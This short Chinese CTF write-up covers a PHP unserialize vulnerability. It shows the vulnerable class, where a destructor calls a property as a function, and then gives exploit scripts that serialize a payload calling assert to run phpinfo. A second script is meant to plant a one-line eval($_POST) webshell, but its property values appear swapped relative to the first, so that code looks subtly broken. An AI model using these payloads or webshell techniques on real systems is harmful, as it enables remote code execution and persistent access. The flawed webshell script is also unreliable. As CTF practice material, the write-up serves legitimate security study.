源代码

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

看起来很容易，简单构造一句话木马即可

EXP

```php
$c = new HelloPhp();
$c->b =  "assert";
$c->a = 'eval(phpinfo());';
echo urlencode(serialize($c));
```

flag 在 phpinfo 里面，同样其实也是可以写马的

写马的 EXP

```php
$c = new HelloPhp();
$c->b =  'eval($_POST[hack]);';
$c->a = "assert";
echo urlencode(serialize($c));
```

